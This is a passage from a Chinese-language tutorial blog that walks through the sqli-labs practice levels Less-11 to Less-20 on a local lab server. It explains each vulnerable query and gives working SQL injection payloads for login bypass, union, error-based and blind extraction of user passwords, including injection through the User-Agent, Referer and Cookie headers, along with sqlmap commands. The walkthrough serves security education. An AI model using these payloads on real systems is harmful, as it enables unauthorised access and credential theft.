class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POST 方式接受变量</span></span><br><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用单引号拼接 SQL</span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出查询的信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。</p><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username = <span class="string">'admin'</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  8 | admin    | admin    |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注释掉 passwd 来登录</span></span><br><span class="line">uname=admin<span class="string">'--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string">uname=admin'</span><span class="comment">#&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释后面语句 并 添加一个永真条件</span></span><br><span class="line">uname=admin&amp;passwd=1<span class="string">' or 1--+&amp;submit=Submit</span></span><br><span class="line"><span class="string">uname=admin&amp;passwd=1'</span>||1--+&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=1<span class="string">' or 1#&amp;submit=Submit</span></span><br><span class="line"><span class="string">uname=admin&amp;passwd=1'</span>||1<span class="comment">#&amp;submit=Submit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 闭合后面语句 并 添加一个永真条件</span></span><br><span class="line">uname=admin&amp;passwd=1<span class="string">'or'</span>1<span class="string">'='</span>1&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=1<span class="string">'||'</span>1<span class="string">'='</span>1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>因为这是一个 POST 型的注入，那么国光这里就再啰嗦一遍，走一遍详细的流程吧</p><h4 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><blockquote><p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos;union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="报错注入1-1"><a href="#报错注入1-1" class="headerlink" title="报错注入1"></a>报错注入1</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos;AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="报错注入2-1"><a href="#报错注入2-1" class="headerlink" title="报错注入2"></a>报错注入2</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; AND (SELECT 1 FROM(SELECT count(*),CONCAT((SELECT (SELECT (SELECT CONCAT(0x7e,0x27,cast(username AS CHAR),0x27,0x7e) FROM users LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1#&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>数据库第一个字母为 <code>s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and left(database(),1)&gt;&apos;r&apos;#&amp;passwd=&amp;submit=Submit</span><br><span class="line">uname=admin&apos; and left(database(),1)&gt;&apos;s&apos;#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="延时盲注-1"><a href="#延时盲注-1" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))#&amp;passwd=&amp;submit=Submit</span><br><span class="line">uname=admin&apos; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><p><strong>加载目标</strong></p><p>可以直接将 Burpsuite 截取的数据包内容保持为文本格式 <code>test.txt</code>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-11/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1:8888/Less-11/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=2333&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>然后直接使用 sqlmap 的 -r 参数来加载这个请求包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test.txt</span><br></pre></td></tr></table></figure><p>也可以手动通过 <code>--data</code> 来对 POST 的数据包内容进行注入检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span></span><br></pre></td></tr></table></figure><p>实际上 <code>--data</code> 比较鸡肋，操作效率比较低，因为比较冷门，所有适合来炫耀自己会这个参数，这样对 sqlmap 不够了解的人 就会觉得很高大上。所以接下来国光我都使用 <code>--data</code> 这个参数来进行注入 🤓</p><p><strong>联合查询注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure><p><strong>布尔盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure><p><strong>延时盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。</p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=(&#39;x&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POST 方式接受变量</span></span><br><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用单引号和括号来拼接 SQL</span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    并没有输出啥信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。</p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=&quot;x&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先使用 双引号 再直接带入 SQL 语句</span></span><br><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>;</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。</p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p><p>国光这里不再做重复无意义的记录了。</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>password = &#39;$passwd&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uname 参数被过滤了</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏</span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select 结果正确:</span><br><span class="line">    <span class="comment"># 更新语句 使用单引号拼接 passwd</span></span><br><span class="line">    $update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mysql 报错:</span><br><span class="line">            print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1<span class="string">' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取请求的 uagent 和 ip 地址</span></span><br><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 输入了uname 和 passwd:</span><br><span class="line">    <span class="comment"># 对这两个参数进行过滤</span></span><br><span class="line">    $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">    $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SQL语句有返回结果:</span><br><span class="line">        <span class="comment"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤</span></span><br><span class="line">        $insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br><span class="line">            输出 $uagent;</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。</p><p><strong>PHP 里用来获取客户端 IP 的变量</strong></p><ul><li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li><li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li><li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li></ul><p>所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-18/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: 1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1:8888/Less-18/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/15893833852620.png" alt="15893833852620"></p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取请求的 referer 和 ip 地址</span></span><br><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 输入了uname 和 passwd:</span><br><span class="line">    <span class="comment"># uname 和 passwd 参数均被过滤</span></span><br><span class="line">    $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">    $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SQL语句有返回结果:</span><br><span class="line">        <span class="comment"># 单引号拼接后直接带入 insert 语句</span></span><br><span class="line">        $insert=<span class="string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')"</span>;</span><br><span class="line">        输出 $_SERVER[<span class="string">'HTTP_REFERER'</span>]</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-19/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/15894186942757.png" alt="15894186942757"></p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$cookee&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> cookie 中不存在 uname 参数:  </span><br><span class="line">    输出了一堆无用的信息</span><br><span class="line">    <span class="keyword">if</span> 提交了 uname 和 passwd:</span><br><span class="line">        <span class="comment"># 进行过滤</span></span><br><span class="line">        $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">        $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">        $cookee = $row1[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">if</span> 有查询结果:</span><br><span class="line">            <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">            setcookie(<span class="string">'uname'</span>, $cookee, time()+<span class="number">3600</span>);</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> POST 数据里面没有 submit 参数:</span><br><span class="line">        $cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span></span><br><span class="line">        $sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br><span class="line">        <span class="keyword">if</span> 查询无结果:</span><br><span class="line">            输出 mysql_error()</span><br><span class="line">        <span class="keyword">if</span> 有结果:</span><br><span class="line">            输出查询的信息</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span></span><br><span class="line">        setcookie(<span class="string">'uname'</span>, $row1[<span class="string">'username'</span>], time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关，所以这里国光老毛病又犯了，这里就再啰嗦一下：</p><h4 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Less-20/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: uname=admin' and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)#</span><br><span class="line"><span class="attribute">Connection</span>: 